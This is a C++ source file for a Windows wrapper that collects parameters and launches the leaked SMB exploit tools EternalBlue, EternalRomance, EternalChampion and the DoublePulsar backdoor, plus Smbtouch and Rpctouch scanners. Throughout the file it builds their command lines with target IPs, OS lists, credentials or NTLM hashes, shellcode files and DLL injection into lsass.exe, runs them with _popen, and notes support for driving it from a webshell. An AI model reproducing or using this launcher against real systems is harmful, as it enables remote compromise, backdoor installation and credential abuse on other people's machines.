//#include "pack.h"
#pragma once


#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#include "resource.h"
#include "ZipUtils/unzip.h"
#include "ZipUtils/zip.h"

#define PC Param*
struct Param
{
	char name[128];
	char des[4096];
	char def[128];
};

int*InitParamNum;Param*InitParamParam;
void SetInitParamPart(Param*p,int*a)
{
	InitParamParam=p;
	InitParamNum=a;
}
void InitParamPart(char*b,char*c,char*d)
{
	strcpy(InitParamParam[*InitParamNum].name,b);strcpy(InitParamParam[*InitParamNum].des,c);strcpy(InitParamParam[*InitParamNum].def,d);
	*InitParamNum+=1;
}

#define UnpackDirectionary "datas"
#define UnpackPassowrd NULL//"psWx095Fl1"
#define UnpackCodePassword 0x9A

CCHAR SmbTouchFileName[]={"datas\\Smbtouch-1.1.1.exe"};
Param SmbTouchP[10];
int SmbTouchPN=0;

CCHAR RpcTouchFileName[]={"datas\\Rpctouch-2.1.0.exe"};
Param RpcTouchP[6];
int RpcTouchPN=0;

CCHAR EternalBlueFileName[]={"datas\\Eternalblue-2.2.0.exe"};
Param EternalBlueP[8];
int EternalBluePN=0;

CCHAR DoublePulsarFileName[]={"datas\\Doublepulsar-1.3.1.exe"};
Param DoublePulsarP[14];
int DoublePulsarPN=0;

CCHAR EternalRomanceFileName[]={"datas\\Eternalromance-1.4.0.exe"};
Param EternalRomanceP[8];
int EternalRomancePN=0;

CCHAR EternalChampionFileName[]={"datas\\Eternalchampion-2.0.0.exe"};
Param EternalChampionP[12];
int EternalChampionPN=0;

void InitParam()
{
	SetInitParamPart((PC)&SmbTouchP[0],&SmbTouchPN);
	InitParamPart("TargetIp","Target IP Address","Necessary");
	InitParamPart("TargetPort","Port used by the SMB service","445");
	InitParamPart("Protocol","SMB (default port 445) or NBT (default port 139)","SMB");
	InitParamPart("Pipe","Test an additional pipe to see if it is accessible (optional)","");
	InitParamPart("Share","Test a file share to see if it is accessible (optional), entered as hex bytes (in unicode)","");
	InitParamPart("Credentials","Type of credentials to use\n\tAnonymous Guest Blank Password NTLM","Anonymous");

	SetInitParamPart((PC)&RpcTouchP[0],&RpcTouchPN);
	InitParamPart("TargetIp","Target IP Address","Necessary");
	InitParamPart("TargetPort","Port used by the MSRPC service. Typically 445 (SMB) or 139 (NBT)","445");
	InitParamPart("Protocol","SMB (SMB over TCP) or NBT (Netbios over TCP)","SMB");
	InitParamPart("NetBIOSName","Name to use if running touch over NBT, Vista and above require real hostname.","Necessary for NBT");
	
	SetInitParamPart((PC)&EternalBlueP[0],&EternalBluePN);
	InitParamPart("TargetIp","Target IP Address","Necessary");
	InitParamPart("TargetPort","Port used by the SMB service for exploit connection","445");
	InitParamPart("MaxExploitAttempts","Number of times to attempt the exploit and groom. Disabled for XP/2K3.(Default: 3 -> 1)","1");
	InitParamPart("GroomAllocations","Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.(XP:8 WIN7:12)","32");
	InitParamPart("Target","Operating System, Service Pack, and Architecture of target OS\n\tXP -> Windows XP 32-Bit All Service Packs\n\tWIN72K8R2 -> Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs","Necessary");
	
	SetInitParamPart((PC)&DoublePulsarP[0],&DoublePulsarPN);
	InitParamPart("TargetIp","Target IP Address","Necessary");
	InitParamPart("TargetPort","Port used by the Double Pulsar back door","445");
	InitParamPart("Protocol","SMB (Ring 0 SMB (TCP 445) backdoor) or RDP (Ring 0 RDP (TCP 3389) backdoor)","SMB");
	InitParamPart("Architecture","Architecture of the target OS  x86(32-bits)  x64(64-bit)","x86");
	InitParamPart("Function","Operation for backdoor to perform\n\tOutputInstall -> Only output the install shellcode to a binary file on disk.\n\tPing -> Test for presence of backdoor\n\tRunDLL -> Use an APC to inject a DLL into a user mode process.\n\tRunShellcode -> Run raw shellcode\n\tUninstall -> Remove's backdoor from system","OutputInstall");
	
	SetInitParamPart((PC)&EternalRomanceP[0],&EternalRomancePN);
	InitParamPart("TargetIp","Target IP Address","Necessary");
	InitParamPart("TargetPort","Target TCP port","445");
	InitParamPart("PipeName","The named pipe to use (spoolss, browser, lsarpc)","spoolss");
	InitParamPart("ShellcodeFile","DOPU (ensure correct architecture) ONLY! Other shellcode will likely BSOD.","Necessary");
	InitParamPart("Credentials","Type of credentials to use\n\tAnonymous Guest Blank Password NTLM","Anonymous");
	InitParamPart("Protocol","SMB (default port 445) or NBT (default port 139)","SMB");
	InitParamPart("Target","Operating System, Service Pack, of target OS\n\tXP_SP0SP1_X86 -> Windows XP Sp0 and Sp1, 32-bit\n\tXP_SP2SP3_X86 -> Windows XP Sp2 and Sp3, 32-bit\n\tXP_SP1_X64 -> Windows XP Sp1, 64-bit\n\tXP_SP2_X64 -> Windows XP Sp2, 64-bit\n\tSERVER_2003_SP0 -> Windows Sever 2003 Sp0, 32-bit\n\tSERVER_2003_SP1 -> Windows Sever 2003 Sp1, 32-bit/64-bit\n\tSERVER_2003_SP2 -> Windows Sever 2003 Sp2, 32-bit/64-bit\n\tVISTA_SP0 -> Windows Vista Sp0, 32-bit/64-bit\n\tVISTA_SP1 -> Windows Vista Sp1, 32-bit/64-bit\n\tVISTA_SP2 -> Windows Vista Sp2, 32-bit/64-bit\n\tSERVER_2008_SP0 -> Windows Server 2008 Sp0, 32-bit/64-bit\n\tSERVER_2008_SP1 -> Windows Server 2008 Sp1, 32-bit/64-bit\n\tSERVER_2008_SP2 -> Windows Server 2008 Sp2, 32-bit/64-bit\n\tWIN7_SP0 -> Windows 7 Sp0, 32-bit/64-bit\n\tWIN7_SP1 -> Windows 7 Sp1, 32-bit/64-bit\n\tSERVER_2008R2_SP0 -> Windows Server 2008 R2 Sp0, 32-bit/64-bit\n\tSERVER_2008R2_SP1 -> Windows Server 2008 R2 Sp1, 32-bit/64-bit","Necessary");

	SetInitParamPart((PC)&EternalChampionP[0],&EternalChampionPN);
	InitParamPart("TargetIp","The actual (non-redirected) Target IP Address","Necessary");
	InitParamPart("TargetPort","The actual (non-redirected) Target TCP port","445");
	InitParamPart("PipeName","The named pipe to use (Win7+ only, need Pipe or Share) (spoolss, browser, lsarpc)","spoolss");
	InitParamPart("ShareName","The name of the share to use in Unicode (Win7+ only, need Pipe or Share)","");
	InitParamPart("ShellcodeBuffer","DOPU Shellcode buffer","Necessary");
	InitParamPart("Credentials","Type of credentials to use\n\tAnonymous Guest Blank Password NTLM","Anonymous");
	InitParamPart("Protocol","SMB (SMB protocol) or NBT (Netbios protocol)","SMB");
	InitParamPart("Target","Operating System, Service Pack, of target OS\n\tXP_SP0SP1_X86 -> Windows XP Sp0 and Sp1, 32-bit\n\tXP_SP2SP3_X86 -> Windows XP Sp2 and Sp3, 32-bit\n\tXP_SP1_X64 -> Windows XP Sp1, 64-bit\n\tXP_SP2_X64 -> Windows XP Sp2, 64-bit\n\tSERVER_2003_SP0 -> Windows Sever 2003 Sp0, 32-bit\n\tSERVER_2003_SP1 -> Windows Sever 2003 Sp1, 32-bit/64-bit\n\tSERVER_2003_SP2 -> Windows Sever 2003 Sp2, 32-bit/64-bit\n\tVISTA_SP0 -> Windows Vista Sp0, 32-bit/64-bit\n\tVISTA_SP1 -> Windows Vista Sp1, 32-bit/64-bit\n\tVISTA_SP2 -> Windows Vista Sp2, 32-bit/64-bit\n\tSERVER_2008_SP0 -> Windows Server 2008 Sp0, 32-bit/64-bit\n\tSERVER_2008_SP1 -> Windows Server 2008 Sp1, 32-bit/64-bit\n\tSERVER_2008_SP2 -> Windows Server 2008 Sp2, 32-bit/64-bit\n\tWIN7_SP0 -> Windows 7 Sp0, 32-bit/64-bit\n\tWIN7_SP1 -> Windows 7 Sp1, 32-bit/64-bit\n\tSERVER_2008R2_SP0 -> Windows Server 2008 R2 Sp0, 32-bit/64-bit\n\tSERVER_2008R2_SP1 -> Windows Server 2008 R2 Sp1, 32-bit/64-bit\n\tWIN8_SP0 -> Windows 8 Sp0, 32-bit/64-bit","Necessary");
	InitParamPart("TargetOsArchitecture","The architecture of the target operating system\n\tUnknown -> The architecture is not known (exploit will figure it out)\n\tx86 -> The target is 32-bit\n\t x64 -> The target is 64-bit","Unknown");

}


int BkArgc;char**BkArgv;
int NowReadNums=0;
bool IsReadFromArgv=false;
//This is supprort to webshell
void ReadThisStr(char *a,int size,bool IsALine=false)
{
	char*p=a;
	if(!IsReadFromArgv)
	{
		std::cin.clear();fflush(stdin);
		if(IsALine)
			std::cin.getline(p,size,'\n');
		else
			scanf("%s",p);
	}
	else
	{
		if(++NowReadNums>BkArgc)
		{
			printf("{NEED}\n");
			//ExitProcess(0);
			exit(0);
		}
		strncpy(p,BkArgv[NowReadNums],size);
	}
}


bool StopThis=false;
char* LoadParam(const char*file,int num,Param pa[])
{
	char*p=new char[4096*8];memset(p,0,sizeof(p));
	char*s=new char[4096*2];memset(s,0,sizeof(s));
	GetModuleFileName(NULL,s,MAX_PATH);PathRemoveFileSpec(s);
	strcat(s,"\\");strcpy(p,s);
	
	strcat(p,file);
	
	if(GetFileAttributes(p)==0xFFFFFFFF)
	{
		printf("No executeable file was be found.\n'%s'\n",p);
		return NULL;
	}
	
	strcat(p," --inconfig \"");
	strcat(p,s);strcat(p,"\\");strcat(p,file);
	p[strlen(p)-1]='l';p[strlen(p)-2]='m';p[strlen(p)-3]='x';
	strcat(p,"\"");

	delete[]s;
	
	char p1[256];
	for(int i=0;i<num;i++)
	{
		if(StopThis)return NULL;

ReQuery:
		printf("%s\n%s (%s):  ",pa[i].des,pa[i].name,pa[i].def);
		memset(p1,0,sizeof(p1));
		/*std::cin.getline(p1,sizeof(p1)-1,'\n');*/ 
		ReadThisStr(&p1[0],sizeof(p1)-1,true);
		if(!strcmp(pa[i].def,"Necessary") && strlen(p1)==0)
			goto ReQuery;

		if(StopThis)return NULL;
		if(p1[0]=='\0' || strlen(p1)==0)
			strcpy(p1,pa[i].def);
		/*if(isupper(pa[i].def[0]) && isupper(pa[i].def[1]))
			for(int k=0;k<strlen(p1);k++)
				p1[k]=toupper(p1[k]);
		if(strlen(pa[i].det)!=0 && isupper(pa[i].def[0]) && !isupper(pa[i].def[1]))
		{
			p1[0]=toupper(p1[0]);
			for(int k=1;k<strlen(p1);k++)
				p1[k]=tolower(p1[k]);
		}*/
		if(!strcmp(pa[i].name,"Target") || !strcmp(pa[i].name,"Protocol"))
			for(int k=0;k<strlen(p1);k++)
				p1[k]=toupper(p1[k]);

		strcat(p," --");strcat(p,pa[i].name);strcat(p," \"");
		for(int q=0;q<strlen(p1);q++)
			if(p1[q]!='"')
			{
				p[strlen(p)+1]='\0';
				p[strlen(p)]=p1[q];
			}
			else strcat(p,"\"\"");
		strcat(p,"\"");
		printf("\n");

		//Special commands for Doublepulsar
		if(!strcmp(pa[i].def,"OutputInstall"))
		{
			SetInitParamPart((PC)&pa[0],&num);
			if(!stricmp(p1,"OutputInstall"))
			{
				InitParamPart("OutputFile","Full path to the output file","Necessary");
			}else if(!stricmp(p1,"RunDLL"))
			{
				InitParamPart("DllPayload","DLL to inject into user mode","Necessary");
				InitParamPart("DllOrdinal","The exported ordinal number of the DLL being injected to call","1");
				InitParamPart("ProcessName","Name of process to inject into","lsass.exe");
				InitParamPart("ProcessCommandLine","Command line of process to inject into","");
			}else if(!stricmp(p1,"RunShellcode"))
			{
				InitParamPart("ShellcodeFile","Full path to the file containing shellcode","Necessary");
				InitParamPart("ShellcodeData","Full path to the file containing shellcode to run","Necessary");
			}
		}

		//Special commands for Credentials
		if(!strcmp(pa[i].def,"Anonymous"))
		{
			SetInitParamPart((PC)&pa[0],&num);
			if(!stricmp(p1,"Blank"))
			{
				InitParamPart("Username","Username entered as hex bytes (in unicode)","Necessary(\\x2f\\x10)");
			}
			else if(!stricmp(p1,"Password"))
			{
				InitParamPart("Username","Username entered as hex bytes (in unicode)","Necessary(\\x2f\\x10)");
				InitParamPart("Password","Password entered as hex bytes (in unicode)","Necessary(\\x2f\\x10)");
			}
			else if(!stricmp(p1,"NTLM"))
			{
				InitParamPart("Username","Username entered as hex bytes (in unicode)","Necessary(\\x2f\\x10)");
				InitParamPart("NtlmHash","NTLM password hash (in hex)","Necessary(\\x2f\\x10)");
			}
		}
	}
	return p;
}


void ExecuteProcess(const char* file)
{
	if(file==NULL)
	{
		return;
	}
	FILE*f=_popen(file,"r");
	char buffer[4096*10]={0};
	char onebuffer[18]={0};
	Sleep(1);
	while(!feof(f))
	{
		memset(onebuffer,0,sizeof(onebuffer));
		fread(onebuffer,sizeof(onebuffer)-1,1,f);
		strcat(buffer,onebuffer);
		char*str=strstr(buffer,"<t:config");
		if(str==NULL)str=strstr(buffer,"<config");
		if(str!=NULL)
			*str='\0';
		printf("%s",onebuffer);
		if(str!=NULL)break;
		Sleep(1);
	}
	printf("\n");
	Sleep(500);
	fclose(f);
}
